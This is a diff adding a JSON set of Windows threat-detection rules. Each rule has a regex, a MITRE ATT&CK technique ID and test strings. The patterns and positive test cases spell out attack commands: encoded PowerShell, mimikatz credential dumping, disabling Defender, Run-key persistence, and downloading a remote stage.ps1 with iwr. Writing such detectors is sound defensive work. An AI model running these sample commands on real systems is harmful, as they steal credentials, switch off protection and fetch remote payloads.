@@ -1,0 +1,148 @@
+{
+  "rules": [
+    {
+      "id": "PS_ENCODED_COMMAND",
+      "description": "PowerShell launched with an encoded command",
+      "target": "processes",
+      "pattern": "(?i)powershell.{0,100}(-enc|-encodedcommand)",
+      "technique": "T1059.001",
+      "severity": "high",
+      "tests": [
+        {
+          "text": "powershell.exe -NoProfile -enc ZQBjAGgAbw==",
+          "expect": true
+        },
+        {
+          "text": "powershell.exe -File C:\\Scripts\\inventory.ps1",
+          "expect": false
+        }
+      ]
+    },
+    {
+      "id": "MIMIKATZ_LSASS",
+      "description": "Credential dumping tool or LSASS access",
+      "target": "processes",
+      "pattern": "(?i)(mimikatz|sekurlsa|procdump.*lsass)",
+      "technique": "T1003.001",
+      "severity": "critical",
+      "tests": [
+        {
+          "text": "C:\\Temp\\mimikatz.exe privilege::debug",
+          "expect": true
+        },
+        {
+          "text": "svchost.exe -k netsvcs",
+          "expect": false
+        }
+      ]
+    },
+    {
+      "id": "DEFENDER_DISABLED",
+      "description": "Defender real-time monitoring disabled",
+      "target": "processes",
+      "pattern": "(?i)(Disable-RealtimeMonitoring|Set-MpPreference.*-Disable)",
+      "technique": "T1562.001",
+      "severity": "high",
+      "tests": [
+        {
+          "text": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
+          "expect": true
+        },
+        {
+          "text": "powershell.exe Get-MpComputerStatus",
+          "expect": false
+        }
+      ]
+    },
+    {
+      "id": "RUN_KEY_PERSISTENCE",
+      "description": "Autorun registry key modified",
+      "target": "startup_commands",
+      "pattern": "(?i)(CurrentVersion.*Run|RunOnce)",
+      "technique": "T1547.001",
+      "severity": "medium",
+      "tests": [
+        {
+          "text": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run = updater.exe",
+          "expect": true
+        },
+        {
+          "text": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\ProductName",
+          "expect": false
+        }
+      ]
+    },
+    {
+      "id": "SUSPICIOUS_SCHTASK",
+      "description": "Scheduled task runs a script interpreter",
+      "target": "scheduled_tasks",
+      "pattern": "(?i)(powershell|cmd\\.exe|wscript|mshta)",
+      "technique": "T1053.005",
+      "severity": "medium",
+      "tests": [
+        {
+          "text": "TaskName: Update | powershell.exe -File C:\\Temp\\u.ps1",
+          "expect": true
+        },
+        {
+          "text": "TaskName: Cleanup | C:\\Windows\\System32\\cleanmgr.exe",
+          "expect": false
+        }
+      ]
+    },
+    {
+      "id": "SUSPICIOUS_SERVICE",
+      "description": "New service with a suspicious name",
+      "target": "services",
+      "pattern": "(?i)(backdoor|malware|evil|psexesvc)",
+      "technique": "T1543.003",
+      "severity": "high",
+      "tests": [
+        {
+          "text": "evil-service | Running",
+          "expect": true
+        },
+        {
+          "text": "WinDefend | Running",
+          "expect": false
+        }
+      ]
+    },
+    {
+      "id": "NEW_LOCAL_ACCOUNT",
+      "description": "Local account with a suspicious name",
+      "target": "users",
+      "pattern": "(?i)(backdoor|hacker|tempuser|svc_evil)",
+      "technique": "T1136.001",
+      "severity": "medium",
+      "tests": [
+        {
+          "text": "backdoor_admin",
+          "expect": true
+        },
+        {
+          "text": "hunter",
+          "expect": false
+        }
+      ]
+    },
+    {
+      "id": "REMOTE_SCRIPT_DOWNLOAD",
+      "description": "Download and execute a remote script",
+      "target": "processes",
+      "pattern": "(?i)(curl|wget|iwr|Invoke-WebRequest).{0,100}(https?://).{0,100}(\\.ps1|\\.sh|\\.exe)",
+      "technique": "T1071.001",
+      "severity": "high",
+      "tests": [
+        {
+          "text": "powershell.exe iwr http://10.0.0.9/stage.ps1 -OutFile stage.ps1",
+          "expect": true
+        },
+        {
+          "text": "powershell.exe Get-ChildItem C:\\Temp",
+          "expect": false
+        }
+      ]
+    }
+  ]
+}
